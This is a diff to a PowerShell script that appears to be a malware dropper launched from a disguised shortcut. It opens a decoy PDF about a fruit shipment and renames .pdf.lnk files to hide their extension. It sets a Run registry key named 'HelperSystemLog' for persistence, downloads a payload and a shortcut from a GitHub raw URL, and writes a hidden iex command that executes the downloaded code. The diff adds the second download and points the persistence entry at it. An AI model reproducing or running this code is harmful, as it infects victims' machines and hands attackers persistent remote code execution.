@@ -1,9 +1,11 @@
 $docpdfname="pengiriman buah apel.pdf";
 echo 1 > $env:tmp\$docpdfname; .$env:tmp\$docpdfname;
 dir *.pdf.lnk | ren -NewName {$_.BaseName};
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "HelperSystemLog" -Value 'C:\T\r' -Force;
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "HelperSystemLog" -Value 'C:\T\update.lnk' -Force;
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/3 -o C:\T\r;
+wget https://github.com/licheng10203040-cloud/1/raw/refs/heads/main/lnk -o C:\T\update.lnk;
 echo '!powershell "-w 1 iex(Get-Content C:\T\r)"' > C:\T\1;
+exit
 
 
 
